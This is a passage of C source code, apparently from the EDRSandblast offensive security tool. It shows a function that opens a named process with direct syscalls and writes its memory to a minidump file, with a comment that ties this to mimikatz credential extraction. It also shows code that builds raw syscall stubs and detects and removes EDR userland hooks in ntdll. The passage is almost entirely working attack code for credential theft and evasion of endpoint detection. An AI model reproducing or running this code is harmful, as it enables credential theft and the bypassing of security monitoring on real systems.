    // write the CSDVersion RVA in the SystemInfoStream
    writeAtRVA(dumpContext, streamRVA + offsetof(MINIDUMP_SYSTEM_INFO, CSDVersionRva), &CSDVersionRVA, sizeof(CSDVersionRVA));

    return STATUS_SUCCES;
}

DWORD writeMiniDumpModuleListStream(DUMP_CONTEXT* dumpContext, PMODULE_INFO pmoduleList) {
    PMODULE_INFO currentModule = pmoduleList;

    ULONG32 modulesCount = 0;

    // Write modules dll metadata (length & path).
    while (currentModule) {
        modulesCount = modulesCount + 1;

        currentModule->nameRVA = dumpContext->RVA;

        // Write the module fullname length.
        ULONG32 DllFullNameLength = (ULONG32)(wcsnlen((WCHAR*) &currentModule->dllName, sizeof(currentModule->dllName)) + 1) * sizeof(WCHAR);
        if (!appendToDump(dumpContext, &DllFullNameLength, 4)) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the ModuleListStream (write of module DllFullName length failed)\n"));
            return STATUS_UNSUCCESSFUL;
        }

        // Write the module fullname length.
        if (!appendToDump(dumpContext, currentModule->dllName, DllFullNameLength)) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the ModuleListStream (write of module DllFullName failed)\n"));
            return STATUS_UNSUCCESSFUL;
        }
        currentModule = currentModule->next;
    }

    // Write the number of modules.
    RVA streamRVA = dumpContext->RVA;
    if (!appendToDump(dumpContext, &modulesCount, 4)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the ModuleListStream (write of number of modules failed)\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // Write the modules data.
    currentModule = pmoduleList;
    while (currentModule) {
        MINIDUMP_MODULE module = { 0 };
        module.BaseOfImage = (ULONG_PTR)currentModule->dllBase;
        module.SizeOfImage = currentModule->ImageSize;
        module.CheckSum = currentModule->checkSum;
        module.TimeDateStamp = currentModule->timeDateStamp;
        module.ModuleNameRva = currentModule->nameRVA;
        module.VersionInfo.dwSignature = 0;
        module.VersionInfo.dwStrucVersion = 0;
        module.VersionInfo.dwFileVersionMS = 0;
        module.VersionInfo.dwFileVersionLS = 0;
        module.VersionInfo.dwProductVersionMS = 0;
        module.VersionInfo.dwProductVersionLS = 0;
        module.VersionInfo.dwFileFlagsMask = 0;
        module.VersionInfo.dwFileFlags = 0;
        module.VersionInfo.dwFileOS = 0;
        module.VersionInfo.dwFileType = 0;
        module.VersionInfo.dwFileSubtype = 0;
        module.VersionInfo.dwFileDateMS = 0;
        module.VersionInfo.dwFileDateLS = 0;
        module.CvRecord.DataSize = 0;
        module.CvRecord.Rva = 0;
        module.MiscRecord.DataSize = 0;
        module.MiscRecord.Rva = 0;
        module.Reserved0 = 0;
        module.Reserved1 = 0;

        
        if (!appendToDump(dumpContext, &module, sizeof(module))) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the ModuleListStream (write of module bytes failed)\n"));
            return STATUS_UNSUCCESSFUL;
        }
        currentModule = currentModule->next;
    }

    // Write the total length in the ModuleListStream directory.
    // header + 1 directory + streamType
    ULONG32 streamSize = sizeof(modulesCount) + modulesCount * sizeof(MINIDUMP_MODULE);
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + sizeof(MINIDUMP_DIRECTORY) + offsetof(MINIDUMP_DIRECTORY, Location.DataSize), &streamSize, sizeof(streamSize));

    // Write our RVA in the ModuleListStream directory.
    // header + 1 directory + streamType + Location.DataSize
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + sizeof(MINIDUMP_DIRECTORY) + offsetof(MINIDUMP_DIRECTORY, Location.Rva), &streamRVA, sizeof(streamRVA));

    return STATUS_SUCCES;
}

DWORD writeMiniDumpMemory64ListStream(DUMP_CONTEXT* dumpContext, PMEMORY_PAGE_INFO pmemoryPages) {
    RVA streamRVA = dumpContext->RVA;

    PMINIDUMP_MEMORY64_LIST memory64List = calloc(1, sizeof(MINIDUMP_MEMORY64_LIST));
    if (!memory64List) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't alloc the Memory64ListStream structure\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // Count the number of memory ranges.
    PMEMORY_PAGE_INFO currentMemoryPage = pmemoryPages;
    ULONG32 memoryPagesCount = 0;
    while (currentMemoryPage) {
        memoryPagesCount++;
        currentMemoryPage = currentMemoryPage->next;
    }
    memory64List->NumberOfMemoryRanges = memoryPagesCount;

    // Extend the structure to host all ranges
    ULONG32 streamSize = sizeof(MINIDUMP_MEMORY64_LIST) + memoryPagesCount * sizeof(MINIDUMP_MEMORY_DESCRIPTOR64);
    PMINIDUMP_MEMORY64_LIST tmp = realloc(memory64List, streamSize);
    if (!tmp) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't realloc the Memory64ListStream structure\n"));
        return STATUS_UNSUCCESSFUL;
    }
    memory64List = tmp;

    // Compute the rva of the actual memory content
    RVA64 baseRVA = (RVA64)streamRVA + (RVA64)streamSize;
    memory64List->BaseRva = baseRVA;

    // Compute the start and size of each memory Page.
    currentMemoryPage = pmemoryPages;
    SIZE_T indexMemoryRange = 0;
    while (currentMemoryPage) {
        memory64List->MemoryRanges[indexMemoryRange].StartOfMemoryRange = currentMemoryPage->startOfMemoryPage;
        memory64List->MemoryRanges[indexMemoryRange].DataSize = currentMemoryPage->dataSize;
        currentMemoryPage = currentMemoryPage->next;
        indexMemoryRange++;
    }

    //Write the actual stream
    appendToDump(dumpContext, memory64List, streamSize);
    free(memory64List);
    memory64List = NULL;

    // Write our length in the Memory64ListStream directory.
    // header + 2 directories + streamType.
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + sizeof(MINIDUMP_DIRECTORY) * 2 + offsetof(MINIDUMP_DIRECTORY, Location.DataSize), &streamSize, sizeof(streamSize));

    // write our RVA in the Memory64ListStream directory
    // header + 2 directories + streamType + Location.DataSize
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + sizeof(MINIDUMP_DIRECTORY) * 2 + offsetof(MINIDUMP_DIRECTORY, Location.Rva), &streamRVA, sizeof(streamRVA));
    
    // dump all the selected memory Pages.
    currentMemoryPage = pmemoryPages;
    while (currentMemoryPage) {
        PBYTE buffer = calloc(currentMemoryPage->dataSize, 1);
        if (!buffer) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the Memory64ListStream stream (failed to allocate memory for memory Page)\n"));
            return STATUS_UNSUCCESSFUL;
        }

        NTSTATUS status = NtReadVirtualMemory(dumpContext->hProcess, (PVOID)(ULONG_PTR)currentMemoryPage->startOfMemoryPage, buffer, currentMemoryPage->dataSize, NULL);
        // once in a while, a Page fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
        if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY) {
            _tprintf_or_not(TEXT("[-] Failed to read memory Page: startOfMemoryPage: 0x%p, dataSize: 0x%llx, state: 0x%lx, protect: 0x%lx, type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...\n"),
                                 (PVOID)(ULONG_PTR)currentMemoryPage->startOfMemoryPage,
                                 currentMemoryPage->dataSize,
                                 currentMemoryPage->state,
                                 currentMemoryPage->protect,
                                 currentMemoryPage->type,
                                 status);
        }
        if (MAXDWORD < currentMemoryPage->dataSize) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: memory range too big ! Aboring\n"));
            return STATUS_UNSUCCESSFUL;
        }
        if (!appendToDump(dumpContext, buffer, (DWORD)currentMemoryPage->dataSize)) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the Memory64ListStream stream (failed to write memory Page)\n"));
            return STATUS_UNSUCCESSFUL;
        }

        // Free memory Page (overwrite it first, just in case).
        memset(buffer, 0, currentMemoryPage->dataSize);
        free(buffer);
        buffer = NULL;
        
        currentMemoryPage = currentMemoryPage->next;
    }

    return STATUS_SUCCES;
}

DWORD SandMiniDumpWriteDump(TCHAR* targetProcessName, WCHAR* dumpFilePath) {
    DWORD status = STATUS_UNSUCCESSFUL;
    DWORD targetProcessPID = 0;
    
    PMODULE_INFO pmoduleList = NULL;
    PMEMORY_PAGE_INFO pmemoryPages = NULL;

    HANDLE hDumpFile = NULL;
    OBJECT_ATTRIBUTES ObjectAttributesDumpFile = { 0 };
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    LARGE_INTEGER AllocationSize = { 0 };

    HANDLE htargetProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributesProcess = { 0 };

    status = SandFindProcessPidByName(targetProcessName, &targetProcessPID);

    if (!NT_SUCCESS(status) || targetProcessPID == 0) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't find target %s process PID\n"), targetProcessName);
        goto cleanup;
    }

    WCHAR FilePath[MAX_PATH] = { 0 };
    const WCHAR prefix[] = L"\\??\\";
    memcpy_s(FilePath, sizeof(FilePath), prefix, sizeof(prefix));
    UNICODE_STRING dumpFilePathAsUnicodeStr = { 0 };
    wcscat_s(FilePath, _countof(FilePath), dumpFilePath);

    getUnicodeStringFromTCHAR(&dumpFilePathAsUnicodeStr, FilePath);
    
    // Create the dump file to validate that the output path is correct beforing accessing the process to dump memory.
    InitializeObjectAttributes(&ObjectAttributesDumpFile, &dumpFilePathAsUnicodeStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = NtCreateFile(&hDumpFile, FILE_GENERIC_WRITE, &ObjectAttributesDumpFile, &IoStatusBlock, &AllocationSize, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (status == STATUS_OBJECT_PATH_NOT_FOUND || status == STATUS_OBJECT_NAME_INVALID) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: the dump file %s path is not valid\n"), FilePath);
        goto cleanup;
    }
    else if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't create empty dump file (NtCreateFile error 0x%x).\n"), status);
        goto cleanup;
    }

    // Open an handle to the process to dump.
    InitializeObjectAttributes(&ObjectAttributesProcess, NULL, 0, NULL, NULL);
    CLIENT_ID clientId = { 0 };
    clientId.ProcessId = UlongToHandle(targetProcessPID);

    status = NtOpenProcess(&htargetProcess, PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributesProcess, &clientId);
    if (status == STATUS_ACCESS_DENIED) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: access denied error while trying to get an handle on the target process (NtOpenProcesserror 0x%x).\n"), status);
        goto cleanup;
    }
    else if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't get an handle to the target process (NtOpenProcess 0x%x).\n"), status);
        goto cleanup;
    }

    // Allocate memory to write the mini dump.
    SIZE_T dumpSz = sizeof(MINIDUMP_HEADER); // arbitrary, the allocation size grows at each appendToDump
    PVOID dumpBaseAddr = calloc(dumpSz, 1);
    if (!dumpBaseAddr) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't allocate memory for dump file.\n"));
        goto cleanup;
    }

    DUMP_CONTEXT dumpContext = { 0 };
    dumpContext.Signature = MINIDUMP_SIGNATURE;
    dumpContext.Version = MINIDUMP_VERSION; // | implementation_version << 16
    dumpContext.hProcess = htargetProcess;
    dumpContext.BaseAddress = dumpBaseAddr;
    dumpContext.RVA = 0;
    dumpContext.DumpMaxSize = dumpSz;

    pmoduleList = getModulesInLdrByInMemoryOrder(htargetProcess);
    if (!pmoduleList) {
        goto cleanup;
    }

    pmemoryPages = getMemoryPagesInfo(dumpContext.hProcess, TRUE);
    if (!pmemoryPages) {
        goto cleanup;
    }

    status = writeMiniDumpHeader(&dumpContext);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = writeMiniDumpDirectories(&dumpContext);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = writeMiniDumpSystemInfoStream(&dumpContext);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = writeMiniDumpModuleListStream(&dumpContext, pmoduleList);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = writeMiniDumpMemory64ListStream(&dumpContext, pmemoryPages);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = NtWriteFile(hDumpFile, NULL, NULL, NULL, &IoStatusBlock, dumpContext.BaseAddress, dumpContext.RVA, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: failed to write dump to file (NtWriteFile 0x%x).\n"), status);
        goto cleanup;
    }

    freeLinkedList(pmoduleList);
    freeLinkedList(pmemoryPages);
    NtClose(htargetProcess);
    NtClose(hDumpFile);

    _tprintf_or_not(TEXT("[+] %s sucessfully dumped with direct syscalls only to: %s\n"), targetProcessName, dumpFilePath);

    return STATUS_SUCCES;

cleanup:
    if (htargetProcess) {
        NtClose(htargetProcess);
    }
    
    if (hDumpFile) {
        NtClose(hDumpFile);
    }

    if (pmoduleList) {
        freeLinkedList(pmoduleList);
    }

    if (pmemoryPages) {
        freeLinkedList(pmemoryPages);
    }

    return STATUS_UNSUCCESSFUL;
}

DWORD SandMiniDumpWriteDumpFromThread(PVOID* args) {
    return SandMiniDumpWriteDump(args[0], args[1]);
}
```

`EDRSandblast/UserlandBypass/Syscalls.c`:

```c
#include <Windows.h>
#include "UserlandHooks.h"
#include "PEParser.h"
#include "PEBBrowse.h"

#define INVALID_SYSCALL_NUMBER 0xFFFFFFFF

DWORD GetSyscallNumberFromMemoryScanning(LPCSTR ntFunctionName) {
    PE* ntdll_disk;
    PE* ntdll_mem;
    getNtdllPEs(&ntdll_mem, &ntdll_disk);
    DWORD syscallNumber = INVALID_SYSCALL_NUMBER;

    PBYTE scanner = PE_functionAddr(ntdll_disk, ntFunctionName);
    for (int i = 0; i < 0x10; i++, scanner++) {
        PDWORD pPotentialSycallNumber = (PDWORD)(scanner + 1);
        if (*scanner == 0xB8 && *pPotentialSycallNumber < 0x10000) { //B8 : mov eax, imm32
            syscallNumber = *pPotentialSycallNumber;
            break;
        }
    }
    return syscallNumber;
}

typedef struct SYSCALL_t {
    LPCSTR Name;
    DWORD RVA;
    DWORD Number;
}SYSCALL;

int CmpSyscallsByRVA(SYSCALL const* a, SYSCALL const* b) {
    if (a->RVA < b->RVA) {
        return -1;
    }
    else if (a->RVA > b->RVA) {
        return +1;
    }
    else {
        return 0;
    }
}

int CmpSyscallsByName(SYSCALL const* a, SYSCALL const* b) {
    return strcmp(a->Name, b->Name);
}

DWORD g_nbSyscalls = 0;
DWORD g_nbSyscallsMax = 0;
SYSCALL* g_syscalls = NULL;

SYSCALL* GetSyscallTable(PDWORD syscallTableSize) {
    if (g_syscalls !=  NULL) {
        *syscallTableSize = g_nbSyscalls;
        return g_syscalls;
    }
    g_nbSyscallsMax = 0x10;
    g_syscalls = calloc(g_nbSyscallsMax, sizeof(SYSCALL));
    if (!g_syscalls) {
        return NULL;
    }
    PE* ntdll_mem = NULL;
    PE* ntdll_disk = NULL;
    getNtdllPEs(&ntdll_mem, &ntdll_disk);

    // Store all Zw* function as a syscall
    for (DWORD nameOrdinal = 0; nameOrdinal < ntdll_mem->exportedNamesLength; nameOrdinal++) {
        LPCSTR functionName = PE_RVA_to_Addr(ntdll_mem, ntdll_mem->exportedNames[nameOrdinal]);
        if (*(WORD*)functionName == *((WORD*)"Zw")) {
            if (g_nbSyscalls == g_nbSyscallsMax) {
                g_nbSyscallsMax *= 2;
                PVOID tmp = realloc(g_syscalls, g_nbSyscallsMax * sizeof(SYSCALL));
                if (!tmp) {
                    return NULL;
                }
                g_syscalls = tmp;
            }
            g_syscalls[g_nbSyscalls].Name = functionName;
            g_syscalls[g_nbSyscalls].RVA = PE_functionRVA(ntdll_mem, functionName);
            g_nbSyscalls++;
        }
    }
    PVOID tmp = realloc(g_syscalls, g_nbSyscalls * sizeof(SYSCALL));
    if (!tmp || !g_nbSyscalls) {
        return NULL;
    }
    g_syscalls = tmp;
    g_nbSyscallsMax = g_nbSyscalls;

    // Sort the Zw* functions by RVA
    qsort(g_syscalls, g_nbSyscalls, sizeof(SYSCALL), CmpSyscallsByRVA);

    // Deduce the syscall numbers from order in table
    for (DWORD j = 0; j < g_nbSyscalls; j++) {
        g_syscalls[j].Number = j;
    }
    // Sort the function back in alphabetical order
    qsort(g_syscalls, g_nbSyscalls, sizeof(SYSCALL), CmpSyscallsByName);

    *syscallTableSize = g_nbSyscalls;
    return g_syscalls;
}

DWORD GetSyscallNumberFromHardcodedInformation(LPCSTR ntFunctionName) {
    PE* ntdll_mem = NULL;
    PE* ntdll_disk = NULL;
    getNtdllPEs(&ntdll_mem, &ntdll_disk);

    DWORD syscallNumber = INVALID_SYSCALL_NUMBER;

    if (!strcmp(ntFunctionName, "NtProtectVirtualMemory")) {
        pRtlGetVersion RtlGetVersion = (pRtlGetVersion)PE_functionAddr(ntdll_mem, "RtlGetVersion");
        OSVERSIONINFOEXW versionInformation = { 0 };
        RtlGetVersion(&versionInformation);
        if (versionInformation.dwMajorVersion == 10 && versionInformation.dwMinorVersion == 0 && versionInformation.dwBuildNumber <= 19044) {
            syscallNumber = 0x50; // win10
        }
        else if (versionInformation.dwMajorVersion == 6 && versionInformation.dwMinorVersion == 3) {
            syscallNumber = 0x4F; // win8.1 / 2012 R2
        }
        else if (versionInformation.dwMajorVersion == 6 && versionInformation.dwMinorVersion == 2) {
            syscallNumber = 0x4E; // win8 / 2012
        }
        else if (versionInformation.dwMajorVersion <= 6) {
            syscallNumber = 0x4D; // win7 / 2008 R2 & before
        }
    }
    return syscallNumber;
}


DWORD GetSyscallNumberFromExportOrdering(LPCSTR ntFunctionName) {
    DWORD syscallTableSize;
    SYSCALL* syscallTable = GetSyscallTable(&syscallTableSize);
    if (syscallTable == NULL) {
        return INVALID_SYSCALL_NUMBER;
    }
    LPSTR zwFunctionName = _strdup(ntFunctionName);
    if (zwFunctionName == NULL) {
        return INVALID_SYSCALL_NUMBER;
    }
    *(WORD*)zwFunctionName = *(WORD*)"Zw";

    DWORD down = 0;
    DWORD up = syscallTableSize;
    while (up - down > 1) {
        DWORD mid = (down + up) / 2;
        if (strcmp(syscallTable[mid].Name, zwFunctionName) <= 0) {
            down = mid;
        }
        else {
            up = mid;
        }
    }
    if (!strcmp(syscallTable[down].Name, zwFunctionName)) {
        return syscallTable[down].Number;
    }
    else {
        return INVALID_SYSCALL_NUMBER;
    }
}

PVOID CreateSyscallStubWithVirtuallAlloc(LPCSTR ntFunctionName) {
    BYTE mov_eax_syscall_number[] = { 0xB8, 0x42, 0x42, 0x42, 0x42 };
    BYTE mov_r10_rcx[] = { 0x4C, 0x8B, 0xD1 };
    BYTE syscall_ret[] = { 0x0F, 0x05, 0xC3 };

    SIZE_T shellcode_len = sizeof(mov_eax_syscall_number) + sizeof(mov_r10_rcx) + sizeof(syscall_ret);
    PBYTE shellcode = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcode) {
        return NULL;
    }
    PBYTE pShellcode = shellcode;

    // get the syscall number through different techniques and check they give the same result
    DWORD syscallNumber = INVALID_SYSCALL_NUMBER;
    DWORD(*GetSyscallNumberFunc[])(LPCSTR) = { GetSyscallNumberFromMemoryScanning , GetSyscallNumberFromExportOrdering , GetSyscallNumberFromHardcodedInformation };

    for (DWORD i = 0; i < _countof(GetSyscallNumberFunc); i++) {
        DWORD syscallNumberCandidate = GetSyscallNumberFunc[i](ntFunctionName);
        if (syscallNumberCandidate != INVALID_SYSCALL_NUMBER) {
            if (syscallNumber != INVALID_SYSCALL_NUMBER && syscallNumber != syscallNumberCandidate) {
                return NULL;
            }
            syscallNumber = syscallNumberCandidate;
        }
    }

    if (syscallNumber == INVALID_SYSCALL_NUMBER) {
        return NULL;
    }

    *(DWORD*)&mov_eax_syscall_number[1] = syscallNumber;
    memcpy(pShellcode, mov_eax_syscall_number, sizeof(mov_eax_syscall_number));
    pShellcode += sizeof(mov_eax_syscall_number);
    memcpy(pShellcode, mov_r10_rcx, sizeof(mov_r10_rcx));
    pShellcode += sizeof(mov_r10_rcx);
    memcpy(pShellcode, syscall_ret, sizeof(syscall_ret));
    pShellcode += sizeof(syscall_ret);

    DWORD oldProtect;
    VirtualProtect(shellcode, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);

    return shellcode;
}

```

`EDRSandblast/UserlandBypass/UserlandHooks.c`:

```c
/*
* All the logic that detects, resolves, patch userland hooks and other related structures
*/

#include <Windows.h>
#include <shlwapi.h>
#include <stdio.h>

#include "../EDRSandblast.h"
#include "FileUtils.h"
#include "UserlandHooks.h"
#include "PEBBrowse.h"
#include "Undoc.h"
#include "Syscalls.h"


#if _DEBUG
int debugf(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    int res = vprintf(fmt, args);
    va_end(args);
    return res;
}
#else
#define debugf(...)
#endif

/*
* Return the address (in "mem") of the first difference between two memory ranges ("mem" & "disk") of size "len".
* If the "lenPatch" pointer is provided, also returns the number of consecutive bytes that differ
*/
PBYTE findDiff(PBYTE mem, PBYTE disk, size_t len, size_t* lenPatch) {
    for (size_t i = 0; i < len; i++) {
        if (mem[i] != disk[i]) {
            size_t patchStartIndex = i;
            if (NULL != lenPatch) {
                while (mem[i] != disk[i] && i < len) {
                    i++;
                }
                *lenPatch = i - patchStartIndex;
            }
            return &mem[patchStartIndex];
        }
    }
    if (NULL != lenPatch) {
        *lenPatch = 0;
    }
    return NULL;
}

/*
* Returns a list of differences (patches) between two memory ranges ("searchStartMem" and "searchStartDisk") of size "sizeToScan".
* The list is a NULL-terminated array of "diff" elements
*/
PATCH_DIFF* findDiffsInRange(PBYTE searchStartMem, PBYTE searchStartDisk, size_t sizeToScan) {
    size_t diffSize;
    PVOID diffAddr = findDiff(searchStartMem, searchStartDisk, sizeToScan, &diffSize);
    DWORD diffsListLen = 4;
    size_t diffsListI = 0;
    PATCH_DIFF* diffsList = malloc(diffsListLen * sizeof(PATCH_DIFF));
    if (NULL == diffsList) {
        debugf("bug in malloc in findDiffsInRange\n");
        exit(1);
    }

    while (diffAddr != NULL && sizeToScan != 0) {
        //debugf("diff found at 0x%p of size %d\n", diffAddr, diffSize);
        searchStartDisk = (BYTE*)searchStartDisk + ((BYTE*)diffAddr + diffSize - (BYTE*)searchStartMem);
        sizeToScan -= ((BYTE*)diffAddr + diffSize - (BYTE*)searchStartMem);
        searchStartMem = (BYTE*)diffAddr + diffSize;
        diffsList[diffsListI].mem_ptr = diffAddr;
        diffsList[diffsListI].disk_ptr = searchStartDisk - diffSize;
        diffsList[diffsListI].size = diffSize;
        diffAddr = findDiff(searchStartMem, searchStartDisk, sizeToScan, &diffSize);
        diffsListI++;
        if (diffsListI >= diffsListLen) {
            diffsListLen *= 2;
            PVOID diffsListTmp = realloc(diffsList, diffsListLen * sizeof(PATCH_DIFF));
            if (NULL == diffsListTmp) {
                debugf("bug in realloc in findDiffsInRange\n");
                exit(1);
            }
            diffsList = diffsListTmp;
        }
    }

    PVOID diffsListTmp = realloc(diffsList, (diffsListI + 1) * sizeof(PATCH_DIFF));
    if (NULL == diffsListTmp) {
        debugf("bug in realloc in findDiffsInRange\n");
        exit(1);
    }
    diffsList = diffsListTmp;
    diffsList[diffsListI].mem_ptr = NULL;
    diffsList[diffsListI].disk_ptr = NULL;
    diffsList[diffsListI].size = 0;
    return diffsList;
}

/*
* Returns the list of differences between the content of a PE on disk and the content of its version in memory.
* Only read-only sections are compared, since writable sections will obviously contain differences.
* Warning : "diskPe" should have been "relocated" to the same address as "memPe" in order not to return all relocations as differences
*/
PATCH_DIFF* findDiffsInNonWritableSections(PE* memPe, PE* diskPe) {
    PATCH_DIFF* list = NULL;
    for (IMAGE_SECTION_HEADER* nonWritableSection = PE_nextSectionHeader_fromPermissions(memPe, NULL, 0, -1, 0);
        nonWritableSection != NULL;
        nonWritableSection = PE_nextSectionHeader_fromPermissions(memPe, nonWritableSection, 0, -1, 0)) {
        debugf("Diffs in section %s:\n", nonWritableSection->Name);
        DWORD sectionRVA = nonWritableSection->VirtualAddress;
        LPVOID sectionAddrDisk = PE_RVA_to_Addr(diskPe, sectionRVA);
        LPVOID sectionAddrMem = PE_RVA_to_Addr(memPe, sectionRVA);
        LPVOID searchStartMem = sectionAddrMem;
        LPVOID searchStartDisk = sectionAddrDisk;
        DWORD remainingSize = nonWritableSection->Misc.VirtualSize;

        list = findDiffsInRange(searchStartMem, searchStartDisk, remainingSize);
    }
    return list;
}



/*
* Looks for a memory needle in a memory haystack
*/
PBYTE memmem(PVOID haystack, SIZE_T haystack_len, PVOID needle, SIZE_T needle_len)
{
    if (!haystack)
        return NULL;
    if (!haystack_len)
        return NULL;
    if (!needle)
        return NULL;
    if (!needle_len)
        return NULL;
    PBYTE h = haystack;
    while (haystack_len >= needle_len)
    {
        if (!memcmp(h, needle, needle_len))
            return h;
        ++h;
        --haystack_len;
    }
    return NULL;
}

/*
* Search for a piece of executable code starting with pattern followed by a jump to expectedTarget
*/
PVOID searchTrampolineInExecutableMemory(PVOID pattern, size_t patternSize, PVOID expectedTarget)
{
    SIZE_T haystack_len;
    PVOID haystack;
    PBYTE patternInExecutableMemory;
    MEMORY_BASIC_INFORMATION mbi = { 0 };

    for (PBYTE addr = 0; ; addr += mbi.RegionSize)
    {
        if (!VirtualQuery(addr, &mbi, sizeof(mbi))) {
            break;
        }

        if (mbi.State != MEM_COMMIT) {
            continue;
        }
        if (mbi.Protect != PAGE_EXECUTE && mbi.Protect != PAGE_EXECUTE_READ && mbi.Protect != PAGE_EXECUTE_READWRITE) {
            continue;
        }
        haystack = mbi.BaseAddress;
        haystack_len = mbi.RegionSize;
        while (haystack_len)
        {
            patternInExecutableMemory = (PBYTE)memmem(haystack, haystack_len, pattern, patternSize);
            if (!patternInExecutableMemory) {
                break;
            }
            if (hookResolver(&patternInExecutableMemory[patternSize]) == expectedTarget) {
                return patternInExecutableMemory;
            }
            haystack_len -= patternInExecutableMemory + 1 - (PBYTE)haystack;
            haystack = patternInExecutableMemory + 1;
        }
    }
    return NULL;
}


VOID unhook(HOOK* hook, UNHOOK_METHOD unhook_method) {
    if (unhook_method == UNHOOK_NONE) {
        return;
    }

    const WCHAR* ntdlolFileName = L".\\ntdlol.txt";
    WCHAR ntdllFilePath[MAX_PATH] = { 0 };
    WCHAR ntdlolFilePath[MAX_PATH] = { 0 };
    HANDLE secondNtdll = INVALID_HANDLE_VALUE;
    PE* ntdll_mem = NULL;
    PE* ntdll_disk = NULL;
    getNtdllPEs(&ntdll_mem, &ntdll_disk);

    PATCH_DIFF* patches = hook->list_patches;
    //merge every small patches into 1 patch to perform a single write
    PATCH_DIFF patch = patches[0];
    int nb_patches = 0;
    while (patches[nb_patches].size) {
        nb_patches++;
    }
    PATCH_DIFF lastPatch = patches[nb_patches - 1];
    patch.size += ((PBYTE)(lastPatch.mem_ptr) - ((PBYTE)(patch.mem_ptr) + patch.size)) + lastPatch.size;

    pNtProtectVirtualMemory unmonitoredNtProtectVirtualMemory = NULL;

    // Method used to get a NtProtectVirtualMemory function that is safe to use
    switch (unhook_method) {
    case UNHOOK_WITH_NTPROTECTVIRTUALMEMORY:
        // in this case, it is not really "safe" to use
        unmonitoredNtProtectVirtualMemory = (pNtProtectVirtualMemory)PE_functionAddr(ntdll_mem, "NtProtectVirtualMemory");
        break;

    case UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE:
    case UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE:
        unmonitoredNtProtectVirtualMemory = getSafeVirtualProtectUsingTrampoline(unhook_method);
        break;

    case UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY:
        GetSystemDirectoryW(ntdllFilePath, _countof(ntdllFilePath));
        PathCombineW(ntdllFilePath, ntdllFilePath, L"ntdll.dll");

        GetTempPathW(MAX_PATH, ntdlolFilePath);
        PathCombineW(ntdlolFilePath, ntdlolFilePath, ntdlolFileName);

        CopyFileW(ntdllFilePath, ntdlolFilePath, FALSE);
        secondNtdll = LoadLibraryW(ntdlolFilePath);
        PE* secondNtdll_pe = PE_create(secondNtdll, TRUE);

        unmonitoredNtProtectVirtualMemory = (pNtProtectVirtualMemory)PE_functionAddr(secondNtdll_pe, "NtProtectVirtualMemory");
        break;
    case UNHOOK_WITH_DIRECT_SYSCALL:
        unmonitoredNtProtectVirtualMemory = (pNtProtectVirtualMemory)CreateSyscallStubWithVirtuallAlloc("NtProtectVirtualMemory");
        if (unmonitoredNtProtectVirtualMemory == NULL) {
            printf_or_not("Something wrong happened with CreateSyscallStubWithVirtuallAlloc, aborting...\n");
            exit(EXIT_FAILURE);
        }
        break;
    default:
        printf_or_not("Unhook method does not exist, exiting...\n");
        exit(EXIT_FAILURE);
        break;
    }

    //actually remove the hook
    DWORD oldProtect;
    PVOID patch_mem_ptr = patch.mem_ptr;
    SIZE_T patch_size = patch.size;
    NTSTATUS status = unmonitoredNtProtectVirtualMemory(
        (HANDLE)-1, // GetCurrentProcess()
        &patch_mem_ptr,
        &patch_size,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );
    if (!NT_SUCCESS(status)) {
        debugf("unmonitoredNtProtectVirtualMemory 1 failed with status 0x%08x\n", status);
        exit(1);
    }

    for (size_t i = 0; i < patch.size; i++) {
        ((PBYTE)patch.mem_ptr)[i] = ((PBYTE)patch.disk_ptr)[i];
    }

    status = unmonitoredNtProtectVirtualMemory(
        (HANDLE)-1, // GetCurrentProcess()
        &patch_mem_ptr,
        &patch_size,
        oldProtect,
        &oldProtect
    );
    if (!NT_SUCCESS(status)) {
